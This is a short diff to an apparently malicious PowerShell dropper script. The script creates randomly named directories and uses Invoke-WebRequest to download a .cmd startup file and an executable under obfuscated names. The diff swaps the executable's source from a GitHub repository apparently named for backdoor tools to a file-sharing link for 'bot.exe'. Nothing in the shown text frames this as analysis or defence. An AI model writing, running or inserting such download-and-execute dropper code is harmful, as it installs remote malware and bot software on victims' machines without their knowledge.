@@ -9,7 +9,7 @@ mkdir NngzPLogJoduDKeSWBMivqvXbnyNnB
 cd sVBXKuzqQdnAeJcsBXMnTVKZUniFmN
 
 #download executable and startup file
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/2.exe" -OutFile B6pXddj9cbV7X.exe
+Invoke-WebRequest -Uri "https://fs03n3.sendspace.com/dl/55b3e4ddeb0c186c4697c4ed5462c329/646dab873619f1c0/b7kew8/bot.exe" -OutFile B6pXddj9cbV7X.exe
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/1.cmd" -OutFile uesFNz8Ds9KS.cmd
 
 
